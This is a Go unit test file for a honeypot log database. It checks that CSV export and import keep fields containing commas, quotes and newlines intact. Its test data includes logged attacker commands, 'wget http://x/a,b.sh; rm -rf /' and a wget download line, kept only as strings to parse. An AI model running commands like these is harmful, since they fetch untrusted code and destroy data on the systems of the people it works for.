package database

import (
	"strings"
	"testing"
)

// TestCSVExportImportRoundTrip guards the data-corruption bug where TimescaleDB
// ImportData used strings.Split (now splitCSVLine): a field containing a comma
// (e.g. an attacker command "wget a,b; rm -rf /") is quoted by csvEscape on
// export and must split back to the SAME fields on import. A naive comma split
// shifted every subsequent column and corrupted source_ip/etc. Exercises the
// csvEscape (export) <-> splitCSVLine (import) format both backends share.
func TestCSVExportImportRoundTrip(t *testing.T) {
	cases := [][]string{
		{"2026-01-01T00:00:00Z", "cowrie", "1.2.3.4", "wget http://x/a,b.sh; rm -rf /", "user,name", `pa"ss`},
		{"a", "b,c", "d e", `f"g"h`, "", "plain"},
		{"x", "y", "z", "no special", "still,comma", `"quoted"`},
	}
	for i, fields := range cases {
		// Export: quote each field, join with commas (what ExportData writes).
		escaped := make([]string, len(fields))
		for j, f := range fields {
			escaped[j] = csvEscape(f)
		}
		line := strings.Join(escaped, ",")

		// Import: split it back (what ImportData now does).
		got := splitCSVLine(line)
		if len(got) != len(fields) {
			t.Fatalf("case %d: got %d fields, want %d (line=%q)", i, len(got), len(fields), line)
		}
		for j := range fields {
			if got[j] != fields[j] {
				t.Errorf("case %d field %d: got %q, want %q (line=%q)", i, j, got[j], fields[j], line)
			}
		}
	}
}

// A field with an embedded newline (e.g. a multi-line attacker command) must
// survive export -> import as one record, not be split into two broken rows.
func TestCSVRecordsKeepQuotedNewlines(t *testing.T) {
	rows := [][]string{
		{"2026-01-01T00:00:00Z", "cowrie", "echo a\nwget http://x/y.sh", `say "hi"` + "\r\nbye"},
		{"2026-01-01T00:00:01Z", "dionaea", "plain", ""},
	}
	var b strings.Builder
	b.WriteString("timestamp,honeypot,command,note\r\n")
	for _, r := range rows {
		esc := make([]string, len(r))
		for i, f := range r {
			esc[i] = csvEscape(f)
		}
		b.WriteString(strings.Join(esc, ",") + "\n")
	}
	recs := splitCSVRecords(b.String())
	if len(recs) != 1+len(rows) {
		t.Fatalf("got %d records, want %d: %q", len(recs), 1+len(rows), recs)
	}
	if recs[0] != "timestamp,honeypot,command,note" {
		t.Fatalf("header = %q", recs[0])
	}
	for i, r := range rows {
		got := splitCSVLine(recs[i+1])
		if strings.Join(got, "|") != strings.Join(r, "|") {
			t.Errorf("row %d: got %q, want %q", i, got, r)
		}
	}
}
